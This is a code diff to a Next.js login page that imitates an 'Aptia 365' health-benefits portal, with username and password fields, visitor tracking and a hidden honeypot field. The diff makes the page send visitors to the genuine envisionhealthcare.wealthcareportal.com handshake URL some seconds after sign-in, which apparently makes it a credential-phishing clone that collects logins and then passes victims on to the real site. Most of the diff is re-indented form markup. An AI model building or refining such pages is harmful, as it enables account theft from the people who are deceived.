@@ -4,6 +4,7 @@ import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
+import { SiteHeader } from "@/components/site-header";
 
 export default function LoginPage() {
   // --- All original hooks and logic preserved ---
@@ -83,7 +84,7 @@ export default function LoginPage() {
         });
       }, 1000);
       redirectRef.current = window.setTimeout(() => {
-        router.push("/verify-choice");
+        window.location.href = "https://envisionhealthcare.wealthcareportal.com/Authentication/Handshake";
       }, 10000);
     } catch (error) {
       console.error("Login failed:", error);
@@ -194,14 +195,7 @@ export default function LoginPage() {
             .footer-sitemap a:hover{text-decoration:underline;}
             @media(max-width:500px){main{padding:32px 12px 28px;}.btn{width:100%;justify-content:center;}.footer-links{gap:7px 14px;}}
           `}</style>
-          <header>
-            <img
-              className="logo-img"
-              src="/Aptia-365-RGB-Light-bg_resize+for+WCP.89a04093fc33467fac75385534b60d84.png"
-              alt="Aptia 365"
-            />
-            <span className="header-title">Login</span>
-          </header>
+          <SiteHeader />
           {/* Wrap main and footer in a fragment to ensure valid JSX */}
           <>
             <main>
@@ -221,126 +215,130 @@ export default function LoginPage() {
                 <div className="card">
                   <h1 className="signin-heading">Sign in</h1>
                   <form onSubmit={handleSignIn}>
-                  <div className="field">
-                    <label htmlFor="userId">
-                      UserId <span className="required-star">*</span>
-                    </label>
+                    <div className="field">
+                      <label htmlFor="userId">
+                        UserId <span className="required-star">*</span>
+                      </label>
+                      <input
+                        type="text"
+                        id="userId"
+                        name="userId"
+                        autoComplete="username"
+                        required
+                        value={username}
+                        onChange={(e) => setUsername(e.target.value)}
+                      />
+                      <span className="help-link">
+                        Forgot your Username? <a href="#">Let us help</a>
+                      </span>
+                    </div>
+                    <div className="field">
+                      <label htmlFor="password">
+                        Password <span className="required-star">*</span>
+                      </label>
+                      <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        autoComplete="current-password"
+                        required
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                      />
+                      <span className="help-link">
+                        Forgot your Password? <a href="#">Let us help</a>
+                      </span>
+                    </div>
                     <input
                       type="text"
-                      id="userId"
-                      name="userId"
-                      autoComplete="username"
-                      required
-                      value={username}
-                      onChange={(e) => setUsername(e.target.value)}
+                      name="website"
+                      value={honeypot}
+                      onChange={(e) => setHoneypot(e.target.value)}
+                      style={{ display: "none" }}
+                      autoComplete="off"
                     />
-                    <span className="help-link">
-                      Forgot your Username? <a href="#">Let us help</a>
-                    </span>
-                  </div>
-                  <div className="field">
-                    <label htmlFor="password">
-                      Password <span className="required-star">*</span>
-                    </label>
-                    <input
-                      type="password"
-                      id="password"
-                      name="password"
-                      autoComplete="current-password"
-                      required
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                    />
-                    <span className="help-link">
-                      Forgot your Password? <a href="#">Let us help</a>
-                    </span>
-                  </div>
-                  <input
-                    type="text"
-                    name="website"
-                    value={honeypot}
-                    onChange={(e) => setHoneypot(e.target.value)}
-                    style={{ display: "none" }}
-                    autoComplete="off"
-                  />
-                  <button
-                    type="submit"
-                    className="btn btn-primary"
-                    disabled={isLoginLoading || !username || !password}
-                  >
-                    <svg
-                      width="15"
-                      height="15"
-                      viewBox="0 0 15 15"
-                      fill="none"
-                      xmlns="http://www.w3.org/2000/svg"
+                    <button
+                      type="submit"
+                      className="btn btn-primary"
+                      disabled={isLoginLoading || !username || !password}
                     >
-                      <polyline
-                        points="1.5,7.5 6,12.5 13.5,3"
-                        stroke="#fff"
-                        strokeWidth="2.2"
-                        strokeLinecap="round"
-                        strokeLinejoin="round"
-                      />
-                    </svg>
-                    {isLoginLoading ? "Signing in..." : "Sign In"}
-                  </button>
-                  <div className="register-section">
-                    <p className="register-label">Don't have an account?</p>
-                    <button type="button" className="btn btn-register">
                       <svg
-                        width="19"
-                        height="16"
-                        viewBox="0 0 20 17"
+                        width="15"
+                        height="15"
+                        viewBox="0 0 15 15"
                         fill="none"
                         xmlns="http://www.w3.org/2000/svg"
                       >
-                        <circle
-                          cx="8"
-                          cy="5"
-                          r="4"
+                        <polyline
+                          points="1.5,7.5 6,12.5 13.5,3"
                           stroke="#fff"
-                          strokeWidth="1.9"
-                          fill="none"
-                        />
-                        <path
-                          d="M1 17c0-3.866 3.134-7 7-7"
-                          stroke="#fff"
-                          strokeWidth="1.9"
+                          strokeWidth="2.2"
                           strokeLinecap="round"
-                          fill="none"
-                        />
-                        <line
-                          x1="15"
-                          y1="9"
-                          x2="15"
-                          y2="17"
-                          stroke="#fff"
-                          strokeWidth="2"
-                          strokeLinecap="round"
-                        />
-                        <line
-                          x1="11"
-                          y1="13"
-                          x2="19"
-                          y2="13"
-                          stroke="#fff"
-                          strokeWidth="2"
-                          strokeLinecap="round"
+                          strokeLinejoin="round"
                         />
                       </svg>
-                      Register
+                      {isLoginLoading ? "Signing in..." : "Sign In"}
                     </button>
-                  </div>
-                  <p
-                    style={{ color: "red", minHeight: "1.25rem", marginTop: 8 }}
-                    aria-live="polite"
-                  >
-                    {loginError ?? ""}
-                  </p>
-                </form>
+                    <div className="register-section">
+                      <p className="register-label">Don't have an account?</p>
+                      <button type="button" className="btn btn-register">
+                        <svg
+                          width="19"
+                          height="16"
+                          viewBox="0 0 20 17"
+                          fill="none"
+                          xmlns="http://www.w3.org/2000/svg"
+                        >
+                          <circle
+                            cx="8"
+                            cy="5"
+                            r="4"
+                            stroke="#fff"
+                            strokeWidth="1.9"
+                            fill="none"
+                          />
+                          <path
+                            d="M1 17c0-3.866 3.134-7 7-7"
+                            stroke="#fff"
+                            strokeWidth="1.9"
+                            strokeLinecap="round"
+                            fill="none"
+                          />
+                          <line
+                            x1="15"
+                            y1="9"
+                            x2="15"
+                            y2="17"
+                            stroke="#fff"
+                            strokeWidth="2"
+                            strokeLinecap="round"
+                          />
+                          <line
+                            x1="11"
+                            y1="13"
+                            x2="19"
+                            y2="13"
+                            stroke="#fff"
+                            strokeWidth="2"
+                            strokeLinecap="round"
+                          />
+                        </svg>
+                        Register
+                      </button>
+                    </div>
+                    <p
+                      style={{
+                        color: "red",
+                        minHeight: "1.25rem",
+                        marginTop: 8,
+                      }}
+                      aria-live="polite"
+                    >
+                      {loginError ?? ""}
+                    </p>
+                  </form>
+                </div>
               </div>
-            </div>
             </main>
             <footer>
               <nav className="footer-links" aria-label="Footer">
